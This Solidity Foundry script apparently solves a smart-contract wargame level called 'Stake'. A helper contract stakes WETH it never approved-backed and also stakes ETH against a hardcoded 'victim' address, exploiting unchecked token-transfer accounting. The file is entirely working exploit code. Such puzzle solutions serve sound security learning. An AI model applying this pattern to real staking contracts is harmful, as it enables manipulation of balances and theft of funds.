// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "forge-std/Script.sol";
import "../src/Stake.sol";

contract Solve is Script {
    function run() external {
        vm.startBroadcast();

        Stake victim = Stake(0x2BDC7A41237Ab5B8E583E89a74fAF775fEC1721f);
        IERC20 weth = IERC20(victim.WETH());

        weth.approve(address(victim), type(uint256).max);
        victim.StakeWETH(0.0011 ether);
        victim.Unstake(0.0011 ether);

        Partner partner = new Partner();
        partner.attack{value: 0.0022 ether}(victim);

        // console.log(address(victim).balance);
        // console.log(victim.totalStaked());
        // console.log(victim.Stakers(tx.origin));
        // console.log(victim.UserStake(tx.origin));

        vm.stopBroadcast();
    }
}

contract Partner {
    function attack(Stake _victim) external payable {
        Stake victim = _victim;
        IERC20 weth = IERC20(victim.WETH());

        weth.approve(address(victim), type(uint256).max);
        victim.StakeWETH(0.0011 ether);
        victim.StakeETH{value: 0.0011 ether}();
    }
}